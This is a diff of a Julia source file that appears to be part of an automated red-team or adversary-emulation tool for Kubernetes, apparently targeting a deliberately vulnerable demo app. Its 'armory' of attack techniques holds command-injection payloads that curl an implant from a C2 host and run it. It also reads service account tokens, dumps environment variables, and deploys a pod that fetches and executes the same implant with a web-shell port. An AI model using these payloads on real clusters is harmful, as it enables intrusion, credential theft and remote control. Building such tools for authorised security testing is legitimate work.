@@ -3,42 +3,42 @@ using StructTypes
 SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
 CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
 
-Base.@kwdef struct ExploitParams 
-    endpoint:: String
-    params:: Dict
-    method:: String
+Base.@kwdef struct ExploitParams
+    endpoint::String
+    params::Dict
+    method::String
 end
 
-function defaul_id() :: String
+function defaul_id()::String
     println("call default id gen")
     return string(rand(1:1000))
 end
 
 
-Base.@kwdef struct DeployPodParams 
-    name:: String
-    image:: String
-    cmd:: Union{String,Nothing} = nothing
-    args:: Vector{String} = []
-    hostIPC:: Bool = false
-    hostPID:: Bool = false
-    hostNetwork:: Bool = false
-    volume_mounts:: Vector{String} = []
-    volumes:: Vector{String} = []
-    ports:: Vector{Dict{String, Int}} = []
+Base.@kwdef struct DeployPodParams
+    name::String
+    image::String
+    cmd::Union{String,Nothing} = nothing
+    args::Vector{String} = []
+    hostIPC::Bool = false
+    hostPID::Bool = false
+    hostNetwork::Bool = false
+    volume_mounts::Vector{String} = []
+    volumes::Vector{String} = []
+    ports::Vector{Dict{String,Int}} = []
 end
 
-Base.@kwdef struct TTP 
-    id:: Union{String, Nothing} = string(uuid4())
-    technique :: String
-    name :: String
-    action :: Union{String, Function, Nothing} = nothing
-    cmd_args :: Union{String, Nothing} = nothing
-    tactics :: Vector{String}
-    ms_id :: String = ""
-    postProcess :: Union{Function, Nothing} = nothing
-    requires :: Union{Dict,Nothing} = Dict()
-    params :: Union{ExploitParams, DeployPodParams, Nothing} = nothing
+Base.@kwdef struct TTP
+    id::Union{String,Nothing} = string(uuid4())
+    technique::String
+    name::String
+    action::Union{String,Function,Nothing} = nothing
+    cmd_args::Union{String,Nothing} = nothing
+    tactics::Vector{String}
+    ms_id::String = ""
+    postProcess::Union{Function,Nothing} = nothing
+    requires::Union{Dict,Nothing} = Dict()
+    params::Union{ExploitParams,DeployPodParams,Nothing} = nothing
 end
 
 StructTypes.StructType(::Type{TTP}) = StructTypes.Mutable()
@@ -52,7 +52,7 @@ function exploit_cmd_injection(ttp::TTP, target::String, c2::String)
 end
 
 
-function readServiceAccountToken(session:: AbstractSession, systemId:: SystemId) :: ServiceAccountTokenExtracted
+function readServiceAccountToken(session::AbstractSession, systemId::SystemId)::ServiceAccountTokenExtracted
     put!(session.commands, "cat $SA_TOKEN_PATH")
     cmd, token = take!(session.results)
     if isnothing(token)
@@ -110,7 +110,7 @@ function get_sa_token_permission()
     return nothing
 end
 
-function readEnvironmentVariables(ev::ActionExecuted) 
+function readEnvironmentVariables(ev::ActionExecuted)
     envVars = Dict()
     if isnothing(ev.output)
         @error "readEnvVar expected to have output, which can be parsed"
@@ -125,7 +125,7 @@ function readEnvironmentVariables(ev::ActionExecuted)
     return EnvironmentVariablesExtracted(ev.target, envVars)
 end
 
-function list_available_binaries( kwargs...) :: Union{Event, Nothing}
+function list_available_binaries(kwargs...)::Union{Event,Nothing}
     # session = await implant.client.interact_session(implant.session_id)
     # res = await session.execute('dpkg', args=["-l"])
     # stdout = res.Stdout.decode('utf-8')
@@ -151,103 +151,114 @@ function deploy_pod()
     return nothing
 end
 
-function getArmory() :: Vector{TTP}
+function startC2Redirector()
+end
+
+function getArmory()::Vector{TTP}
     return [
-            TTP(
-                name="Exploit Envoy Proxy CMD injection",
-                tactics=[string(InitialAccess)],
-                technique=string(ExploitPublicFacingApp),
-                params=ExploitParams(
-                    endpoint="http://unguard.kube/healthz",
-                    params=Dict("path" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
-                    method="GET",
-                )
-            ),
-            TTP(
-                name="Exploit Proxy Service CMD injection",
-                tactics=[string(LateralMovement)],
-                technique=string(ExploitationForPrivilegeEscalation),
-                postProcess=exploit_cmd_injection,
-                params=ExploitParams(
-                    endpoint=raw"$TARGET/image",
-                    params=Dict("url" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
-                    method="GET",
-                ),
-            ),
-            # TTP(
-            #     name="Exploit Public-Facing Application",
-            #     tactics=Tactic.InitialAccess,
-            #     technique=Technique.ExploitPublicFacingApp,
-            # ),
-            TTP(
-                name="Read Service Account Token",
-                ms_id="MS-TA9016",
-                technique=string(ContainerServiceAccount),  # MITRE would be StealApplicationAccessToken
-                tactics=[string(CredentialAccess)],
-                action=readServiceAccountToken,
-                requires=Dict("accessLevel"=> UserRead),
-                # consequence=["pod_name", "serviceaccount_name", "namespace name"],
-                # postProcess=readServiceAccountToken,
-            ),
-            TTP(
-                name="Check ServiceAccount permissions",
-                tactics=[string(Discovery)],
-                technique=string(PermissionGroupsDiscovery_CloudGroups),  # TODO: not sure about this mapping
-                requires=Dict("kind" => "ServiceAccount"),
-                postProcess=get_sa_token_permission,
-            ),
-            # TTP(
-            #     name="Container and Resource Discovery",
-            #     tactics=Tactic.Discovery,
-            #     technique=Technique.ContainerAndResourceDiscovery,
-            # ),
-            # TTP(name="Get working directory", tactics=Tactic.Discovery, technique="", action="pwd"),
-            # TTP(name="List files", tactics=Tactic.Discovery, technique=Technique.FileAndDirectoryDiscovery, action="ls"),
-            TTP(
-                name="List environment variables",
-                tactics=[string(Discovery)],
-                technique=string(GatherVictimHostInformation),
-                action="env",
-                postProcess=readEnvironmentVariables,
-                requires=Dict("os"=> ["linux", "macOS"], "accessLevel"=> UserExecute),
-            ),
-            TTP(
-                name="List binaries",
-                tactics=[string(Discovery)],
-                technique=string(GatherVictimHostInformation),
-                postProcess=list_available_binaries,
-                requires=Dict("os"=> "linux", "accessLevel"=> UserExecute),
-            ),
-            TTP(
-                name="System Network Configuration Discovery",
-                tactics=[string(Discovery)],
-                technique=string(SystemNetworkConfigurationDiscovery),
-                action="ifconfig",
-                requires=Dict("kind" => "Pod", "accessLevel" => UserExecute),
-            ),
-            TTP(
-                name="Deploy Container",
-                tactics=[string(Execution)],
-                technique=string(DeployContainer),
-                # requires={"can": "create pods"},
-                postProcess=deploy_pod,
-                params=DeployPodParams(
-                    name="Debug Pod",
-                    image="r0binak/mtkpi:v1",
-                    cmd= "/bin/bash",
-                    args= ["-c", raw"curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b"],
-                    ports=[
-                        Dict("containerPort" => 7681), # TTYD port for web shell, might be skipped
-                    ],
-                ),
+        TTP(
+            name="Exploit Envoy Proxy CMD injection",
+            tactics=[string(InitialAccess)],
+            technique=string(ExploitPublicFacingApp),
+            params=ExploitParams(
+                endpoint="http://unguard.kube/healthz",
+                params=Dict("path" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
+                method="GET",
             )
-            # TTP(  # video for implementation KubeCon NA'23: https://www.youtube.com/watch?v=mqnm0AXoNgc
-            #     # TODO implement
-            #     name="Sidecar Injection",
-            #     tactics=Tactic.Execution,
-            #     technique=Technique.Deploycontainer,
-            #     ms_id="MS-TA9011",
-            #     requires=["role:can-patch-deployment"],
-            # ),
-        ]
+        ),
+        TTP(
+            name="Exploit Proxy Service CMD injection",
+            tactics=[string(LateralMovement)],
+            technique=string(ExploitationForPrivilegeEscalation),
+            postProcess=exploit_cmd_injection,
+            params=ExploitParams(
+                endpoint=raw"$TARGET/image",
+                params=Dict("url" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
+                method="GET",
+            ),
+        ),
+        TTP(
+            name="Start C2 Redirector",
+            tactics=[string(CommandAndControl)],
+            technique=string(WebService),
+            action=startC2Redirector,
+            requires=Dict("kind" => "Listener")
+        ),
+
+        # TTP(
+        #     name="Exploit Public-Facing Application",
+        #     tactics=Tactic.InitialAccess,
+        #     technique=Technique.ExploitPublicFacingApp,
+        # ),
+        TTP(
+            name="Read Service Account Token",
+            ms_id="MS-TA9016",
+            technique=string(ContainerServiceAccount),  # MITRE would be StealApplicationAccessToken
+            tactics=[string(CredentialAccess)],
+            action=readServiceAccountToken,
+            requires=Dict("accessLevel" => UserRead),
+            # consequence=["pod_name", "serviceaccount_name", "namespace name"],
+            # postProcess=readServiceAccountToken,
+        ),
+        TTP(
+            name="Check ServiceAccount permissions",
+            tactics=[string(Discovery)],
+            technique=string(PermissionGroupsDiscovery_CloudGroups),  # TODO: not sure about this mapping
+            requires=Dict("kind" => "ServiceAccount"),
+            postProcess=get_sa_token_permission,
+        ),
+        # TTP(
+        #     name="Container and Resource Discovery",
+        #     tactics=Tactic.Discovery,
+        #     technique=Technique.ContainerAndResourceDiscovery,
+        # ),
+        # TTP(name="Get working directory", tactics=Tactic.Discovery, technique="", action="pwd"),
+        # TTP(name="List files", tactics=Tactic.Discovery, technique=Technique.FileAndDirectoryDiscovery, action="ls"),
+        TTP(
+            name="List environment variables",
+            tactics=[string(Discovery)],
+            technique=string(GatherVictimHostInformation),
+            action="env",
+            postProcess=readEnvironmentVariables,
+            requires=Dict("os" => ["linux", "macOS"], "accessLevel" => UserExecute),
+        ),
+        TTP(
+            name="List binaries",
+            tactics=[string(Discovery)],
+            technique=string(GatherVictimHostInformation),
+            postProcess=list_available_binaries,
+            requires=Dict("os" => "linux", "accessLevel" => UserExecute),
+        ),
+        TTP(
+            name="System Network Configuration Discovery",
+            tactics=[string(Discovery)],
+            technique=string(SystemNetworkConfigurationDiscovery),
+            action="ifconfig",
+            requires=Dict("kind" => "Pod", "accessLevel" => UserExecute),
+        ),
+        TTP(
+            name="Deploy Container",
+            tactics=[string(Execution)],
+            technique=string(DeployContainer),
+            # requires={"can": "create pods"},
+            postProcess=deploy_pod,
+            params=DeployPodParams(
+                name="Debug Pod",
+                image="r0binak/mtkpi:v1",
+                cmd="/bin/bash",
+                args=["-c", raw"curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b"],
+                ports=[
+                    Dict("containerPort" => 7681), # TTYD port for web shell, might be skipped
+                ],
+            ),
+        )
+        # TTP(  # video for implementation KubeCon NA'23: https://www.youtube.com/watch?v=mqnm0AXoNgc
+        #     # TODO implement
+        #     name="Sidecar Injection",
+        #     tactics=Tactic.Execution,
+        #     technique=Technique.Deploycontainer,
+        #     ms_id="MS-TA9011",
+        #     requires=["role:can-patch-deployment"],
+        # ),
+    ]
 end
